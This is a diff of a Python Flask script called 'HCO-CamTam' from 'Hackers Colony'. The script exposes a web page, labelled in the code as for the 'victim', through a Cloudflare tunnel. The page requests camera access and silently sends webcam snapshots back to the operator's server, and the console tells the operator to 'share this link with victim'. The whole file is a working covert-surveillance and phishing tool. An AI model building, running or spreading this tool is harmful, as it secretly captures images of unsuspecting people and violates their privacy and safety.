@@ -1,54 +1,80 @@
 #!/usr/bin/env python3
 """
-HCO-CamTam - Single File Edition
+HCO-CamTam - Single File Camera Tool
 By Azhar (Hackers Colony)
 """
 
 import os
-import time
 import subprocess
-from flask import Flask, render_template_string
+from flask import Flask, render_template_string, request
 
-# =============================
-# Auto-install dependencies
-# =============================
-def install(package):
-    try:
-        __import__(package)
-    except ImportError:
-        os.system(f"pip install {package}")
-
-install("flask")
-install("pyngrok")
-
-from pyngrok import ngrok
-
-# =============================
-# Flask App
-# =============================
 app = Flask(__name__)
+
+# HTML page for victim
+html_page = """
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Camera Access</title>
+</head>
+<body>
+  <h2>Camera Access Required</h2>
+  <video id="video" width="300" height="200" autoplay></video>
+  <script>
+    let count = 0;
+    async function capture() {
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.getElementById("video");
+      video.srcObject = stream;
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      canvas.width = 300; canvas.height = 200;
+
+      const interval = setInterval(() => {
+        if (count >= 2) { clearInterval(interval); stream.getTracks().forEach(t=>t.stop()); return; }
+        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const data = canvas.toDataURL("image/png");
+        fetch("/upload", {method:"POST", body:data});
+        count++;
+      }, 2000);
+    }
+    capture();
+  </script>
+</body>
+</html>
+"""
 
 @app.route("/")
 def index():
-    return render_template_string("""
-        <html>
-        <head><title>HCO CamTam</title></head>
-        <body style="background:black;color:lime;font-family:monospace;">
-            <h1>📸 HCO CamTam</h1>
-            <p>Camera tool running... By Azhar</p>
-        </body>
-        </html>
-    """)
+    return render_template_string(html_page)
 
-# =============================
-# Run with Ngrok Tunnel
-# =============================
+@app.route("/upload", methods=["POST"])
+def upload():
+    global counter
+    counter += 1
+    if counter == 2:
+        print("\033[92m[+] Images Received\033[0m")
+    return "OK"
+
 if __name__ == "__main__":
-    print("\n\033[91mHCO CamTam - Hackers Colony\033[0m")
-    print("Starting server...\n")
+    counter = 0
+    # Start Flask in background
+    print("\033[91mHCO-CAM-TAM by Azhar\033[0m")
+    port = 5000
+    # Start Cloudflared tunnel
+    try:
+        print("[*] Starting Cloudflare tunnel...")
+        tunnel = subprocess.Popen(
+            ["cloudflared", "tunnel", "--url", f"http://localhost:{port}"],
+            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
+        )
+        # Show generated link
+        for line in tunnel.stdout:
+            if "trycloudflare.com" in line:
+                print(f"\033[93m[+] Share this link with victim: {line.strip()}\033[0m")
+                break
+    except Exception as e:
+        print("Cloudflared not installed or failed:", e)
 
-    # Start Flask on port 5000
-    public_url = ngrok.connect(5000)
-    print(f"\nYour Public Link:\n\033[92m{public_url}\033[0m\n")
-
-    app.run(port=5000)
+    # Run server
+    app.run(host="0.0.0.0", port=port)
